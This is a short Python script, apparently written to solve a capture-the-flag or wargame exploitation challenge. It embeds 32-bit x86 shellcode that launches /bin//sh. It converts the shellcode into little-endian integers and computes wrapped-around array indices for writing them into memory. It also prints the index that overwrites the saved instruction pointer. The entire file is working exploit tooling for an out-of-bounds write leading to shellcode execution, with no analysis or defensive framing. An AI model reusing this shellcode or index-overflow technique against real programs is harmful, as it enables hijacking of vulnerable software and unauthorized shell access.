
def main():
    shellcode = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
    zero = 4294967296
    i = 0
    j = 0
    while i < len(shellcode):
        if i % 4 == 0 :
            print("Number : ", int.from_bytes(shellcode[i : i + 4], byteorder='little', signed=False))
            if j % 3 == 0:
                print("Index : ", (zero + j * 4) / 4)
            else:
                print("Index : ", j)
            print("------------")
            j+=1
        i+=1

    print("idx of $eip : ", (114 * 4 + 4294967296) / 4)



    

if __name__ == "__main__":
    main()
